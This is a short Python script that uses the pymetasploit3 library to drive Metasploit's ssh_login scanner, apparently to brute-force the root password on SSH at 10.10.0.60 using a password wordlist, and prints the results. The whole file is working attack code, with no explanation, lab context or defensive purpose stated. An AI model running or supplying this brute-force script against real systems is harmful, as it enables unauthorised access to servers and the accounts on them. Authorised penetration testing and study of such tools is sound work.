from pymetasploit3.msfrpc import MsfRpcClient

client = MsfRpcClient(server='127.0.0.1', password='msf', port=55553, encoding='utf-8')
exploit = client.modules.use(mtype='auxiliary', mname='scanner/ssh/ssh_login')
exploit['RHOSTS'] = '10.10.0.60'
exploit['THREADS'] = 5
exploit['USERNAME'] = 'root'
exploit['PASS_FILE'] = '/usr/share/metasploit-framework/data/wordlists/password.2ed'
exploit['VERBOSE'] = True
cid = client.consoles.console().cid
console = client.consoles.console(cid)
result = console.run_module_with_output(exploit)
print(result)
console.destroy()
